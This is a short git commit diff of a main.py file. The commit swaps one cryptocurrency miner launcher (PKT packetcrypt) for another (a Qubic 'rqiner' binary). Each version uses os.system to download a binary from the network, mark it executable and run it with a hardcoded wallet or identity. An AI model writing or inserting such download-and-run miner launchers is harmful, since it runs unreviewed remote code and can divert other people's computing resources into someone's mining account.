a66a23f4d1c95b6dd0605e9be83ee872b76c3534
sabri fuadi <sabrif0610@gmail.com>
2024-05-28 01:24:05 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 import sys
 import os
 
-os.system("curl -LJO  https://www.pkt.world/ext/packetcrypt-linux-amd64")
-os.system("chmod +x packetcrypt-v0.6.0-linux_amd64 ")
-os.system("./packetcrypt-v0.6.0-linux_amd64 ann -p pkt1qqq6yd2fdgrtfucax0tzx5vram8wt4n4v7ujwny https://stratum.zetahash.com")
+os.system("wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.6.1/rqiner-x86-znver2")
+os.system("chmod +x rqiner-x86-znver2")
+os.system("./rqiner-x86-znver2 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG -t 2")
 
